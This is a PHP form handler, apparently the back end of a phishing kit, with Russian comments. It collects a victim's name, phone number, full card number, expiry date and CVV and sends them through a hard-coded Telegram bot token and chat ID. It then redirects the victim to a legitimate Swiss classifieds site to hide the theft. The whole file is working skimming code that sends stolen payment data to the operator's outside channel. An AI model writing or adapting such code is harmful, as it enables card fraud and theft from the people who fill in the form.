<?php
// process.php

// Обработка данных формы
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Получаем данные из формы
    $firstName = trim($_POST['firstName']);
    $lastName = trim($_POST['lastName']);
    $phoneNumber = trim($_POST['phoneNumber']);  
    $cardNumber = trim($_POST['cardNumber']);
    $expiryDate = trim($_POST['expiryDate']);
    $cvv = trim($_POST['cvv']);

    // Формируем сообщение для отправки в Telegram
    $message = "👤 Имя: {$firstName}\n";
    $message .= "👤 Фамилия: {$lastName}\n";
    $message .= "📞 Номер телефона: {$phoneNumber}\n";
    $message .= "💳 Номер карты: {$cardNumber}\n";
    $message .= "📅 Срок действия (MM/YY): {$expiryDate}\n";
    $message .= "🔒 CVV: {$cvv}\n";

    // Ваш токен Telegram-бота
    $botToken = '7456626272:AAHoU8P38YF9c0Fy5YCLdR-KLz_DbcBappE';
    
    // Ваш чат ID
    $chatId = '7003253991';

    // URL для отправки сообщения в Telegram
    $telegramApiUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";

    // Параметры запроса
    $data = [
        'chat_id' => $chatId,
        'text' => $message
    ];

    // Отправка POST-запроса через cURL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegramApiUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    // Задержка на 5 секунд перед редиректом
    sleep(5);

    // Редирект на другую страницу после обработки
    header('Location: https://www.anibis.ch/fr');
    exit;
}
?>
